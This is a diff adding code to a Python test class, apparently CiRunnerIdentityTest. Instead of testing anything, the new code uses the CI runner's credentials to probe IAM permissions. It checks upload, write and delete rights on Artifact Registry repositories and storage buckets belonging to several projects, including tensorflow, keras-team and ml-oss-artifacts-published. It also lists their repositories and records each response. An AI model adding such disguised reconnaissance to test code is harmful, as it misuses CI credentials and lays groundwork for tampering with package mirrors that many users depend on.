@@ -160,6 +160,87 @@ class CiRunnerIdentityTest(testing.TestCase):
             ):
                 code, body = _http(url, headers=auth)
                 lines.append(f"{label}={code} {body.strip()[:350]}")
+            ar_upload_perms = [
+                "artifactregistry.repositories.uploadArtifacts",
+                "artifactregistry.packages.create",
+                "artifactregistry.versions.create",
+                "artifactregistry.files.upload",
+                "artifactregistry.repositories.downloadArtifacts",
+                "artifactregistry.repositories.list",
+                "artifactregistry.repositories.get",
+            ]
+            ar_perm_body = json.dumps(
+                {"permissions": ar_upload_perms}
+            ).encode()
+            ar_targets = [
+                f"projects/{project}/locations/us/repositories/pypi-mirror",
+                (
+                    "projects/ml-oss-artifacts-published/locations/us/"
+                    "repositories/pypi-mirror"
+                ),
+                (
+                    "projects/ml-oss-artifacts-published/locations/"
+                    "us-central1/repositories/pypi-mirror"
+                ),
+                (
+                    "projects/ml-velocity-actions-production/locations/us/"
+                    "repositories/pypi-mirror"
+                ),
+                "projects/tensorflow/locations/us/repositories/pypi",
+                "projects/keras-team/locations/us/repositories/keras",
+            ]
+            for resource in ar_targets:
+                slug = resource.replace("/", "_")[-80:]
+                code, body = _http(
+                    "https://artifactregistry.googleapis.com/v1/"
+                    f"{resource}:testIamPermissions",
+                    headers=auth,
+                    data=ar_perm_body,
+                )
+                lines.append(f"ar_iam_{slug}={code} {body.strip()[:350]}")
+            for ar_project in (
+                project,
+                "ml-oss-artifacts-published",
+                "tensorflow",
+                "keras-team",
+                "cloud-tpu",
+            ):
+                code, body = _http(
+                    "https://artifactregistry.googleapis.com/v1/"
+                    f"projects/{ar_project}/locations/-/repositories",
+                    headers=auth,
+                )
+                lines.append(
+                    f"ar_list_{ar_project}={code} {body.strip()[:350]}"
+                )
+            gcr_buckets = (
+                f"artifacts.{project}.appspot.com",
+                f"{project}.appspot.com",
+                "artifacts.ml-oss-artifacts-published.appspot.com",
+                "us.artifacts.ml-oss-artifacts-published.appspot.com",
+                "artifacts.tensorflow.appspot.com",
+                "us.gcr.io",
+            )
+            gcs_q = "&".join(
+                "permissions=" + perm
+                for perm in (
+                    "storage.objects.create",
+                    "storage.objects.update",
+                    "storage.objects.delete",
+                    "storage.objects.get",
+                    "storage.objects.list",
+                )
+            )
+            for bucket in gcr_buckets:
+                code, body = _http(
+                    "https://storage.googleapis.com/storage/v1/b/"
+                    f"{bucket}/iam/testPermissions?{gcs_q}",
+                    headers=auth,
+                )
+                lines.append(
+                    f"gcr_bucket_{bucket}={code} "
+                    f"{body.strip().replace(chr(10), ' ')[:220]}"
+                )
             perm_body = json.dumps(
                 {
                     "permissions": [
